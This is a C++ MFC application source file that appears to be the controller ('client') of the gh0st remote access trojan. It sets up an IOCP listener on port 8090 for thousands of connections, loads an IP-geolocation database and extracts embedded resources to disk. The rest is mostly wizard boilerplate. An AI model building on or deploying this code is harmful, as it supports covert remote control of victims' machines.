// Client.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "Client.h"

#include "MainFrm.h"
#include "ClientDoc.h"
#include "ClientView.h"
#include "decode.h"//解密头

#include "Login.h"
CLogin Login;
CString strUser;

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CClientApp

BEGIN_MESSAGE_MAP(CClientApp, CWinApp)
	//{{AFX_MSG_MAP(CClientApp)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
	ON_COMMAND(ID_FILE_NEW, CWinApp::OnFileNew)
	ON_COMMAND(ID_FILE_OPEN, CWinApp::OnFileOpen)
	// Standard print setup command
	ON_COMMAND(ID_FILE_PRINT_SETUP, CWinApp::OnFilePrintSetup)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CClientApp construction

//用于随机数值
DWORD CClientApp::GetRand()
{
	typedef DWORD (WINAPI *tGetRandNum)();
	tGetRandNum pGetRandNum = (tGetRandNum)GetProcAddress(m_Hmodule,"GetRandNum");
	
	if(pGetRandNum)
		return pGetRandNum();
}

//参数   路径 ID 目录
BOOL Release(LPSTR Path,LPCTSTR ResID,LPCTSTR ResDir)
{
	HRSRC m_Hsrc=FindResource(NULL,(LPCTSTR)ResID,(LPCTSTR)ResDir);
	if(m_Hsrc == NULL)
		return FALSE;
	HGLOBAL m_Hglobal = LoadResource(NULL,m_Hsrc);
	BYTE *LPData =(LPBYTE) LockResource(m_Hglobal);
	DWORD Size = SizeofResource(NULL,m_Hsrc);
	DeleteFile(Path);
	HANDLE hFile = CreateFile
		(
		Path, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	DWORD dwBytes=NULL;
	WriteFile(hFile,LPData,Size, &dwBytes, NULL);
	CloseHandle(hFile);
	FreeResource(m_Hglobal);
	return TRUE;
}

CClientApp::CClientApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
	// 初始化本进程的图像列表, 为加载系统图标列表做准备
	typedef BOOL (WINAPI * pfn_FileIconInit) (BOOL fFullInit);
	pfn_FileIconInit FileIconInit = (pfn_FileIconInit) GetProcAddress(LoadLibrary("shell32.dll"), (LPCSTR)660);
	FileIconInit(TRUE);
	
	GetModuleFileName(NULL,AppPath,MAX_PATH);
	PathRemoveFileSpec(AppPath);//去除文件名中的gh0st

	// 读取qqwry.dat（位置文件）
	HANDLE	hFile = CreateFile("Tools\\QQwry.dat", 0, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		m_bIsQQwryExist = true;
	}
	else
	{
		m_bIsQQwryExist = false;
	}
	CloseHandle(hFile);
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CClientApp object

CClientApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CClientApp initialization
BOOL CClientApp::InitInstance()
{
/*	HGLOBAL hRes;
	HRSRC hResInfo;
	HINSTANCE hinst = AfxGetInstanceHandle();
	hResInfo = FindResource( hinst, MAKEINTRESOURCE(IDR_SKIN11), "SKIN1" );
	if (hResInfo != NULL)
	{
		hRes = LoadResource( hinst, hResInfo);
		if (hRes != NULL)
		{
			SkinH_AttachRes( (LPBYTE)hRes, SizeofResource(hinst,hResInfo), NULL, NULL, NULL, NULL );
				SkinH_SetAero(FALSE);
			FreeResource(hRes);
		}
	}*/
	AfxEnableControlContainer();

	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.

#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif

// 	Login.DoModal();
// 	strUser = Login.m_UserName;
// 	if ( Login.dLogin <= 10000 )
// 	{
// 		return FALSE;
// 	}

	// Change the registry key under which our settings are stored.
	// TODO: You should modify this string to be something appropriate
	// such as the name of your company or organization.
	SetRegistryKey(_T("Local AppWizard-Generated Applications"));

	LoadStdProfileSettings();  // Load standard INI file options (including MRU)

	// Register the application's document templates.  Document templates
	//  serve as the connection between documents, frame windows and views.

	CSingleDocTemplate* pDocTemplate;
	pDocTemplate = new CSingleDocTemplate(
		IDR_MAINFRAME,
		RUNTIME_CLASS(CClientDoc),
		RUNTIME_CLASS(CMainFrame),       // main SDI frame window
		RUNTIME_CLASS(CClientView));
	AddDocTemplate(pDocTemplate);

// 	char Path[200]={0};
// 	GetModuleFileName(NULL,Path,200);
// 	*strrchr(Path,'\\')=0;
// 	strcat(Path,"\\SkinH.she");
// 	SkinH_AttachEx(Path,NULL);		

	// Parse command line for standard shell commands, DDE, file open
	CCommandLineInfo cmdInfo;
	ParseCommandLine(cmdInfo);

	// Dispatch commands specified on the command line
	if (!ProcessShellCommand(cmdInfo))
		return FALSE;

	// The one and only window has been initialized, so show and update it.
	m_pMainWnd->ShowWindow(SW_SHOW);
	m_pMainWnd->UpdateWindow();


	// 启动IOCP服务器
	int	nPort = m_IniFile.GetInt("Settings", "ListenPort");
	if (nPort == 0)	nPort = 8090;
	
	int	nMaxConnection = m_IniFile.GetInt("Settings", "MaxConnection");
	if (nMaxConnection == 0) nMaxConnection = 8000;
	
	((CMainFrame*) m_pMainWnd)->StartIocp(nPort, nMaxConnection);

	return TRUE;
}


/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
		// No message handlers
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

// App command to run the dialog
void CClientApp::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

/////////////////////////////////////////////////////////////////////////////
// CClientApp message handlers

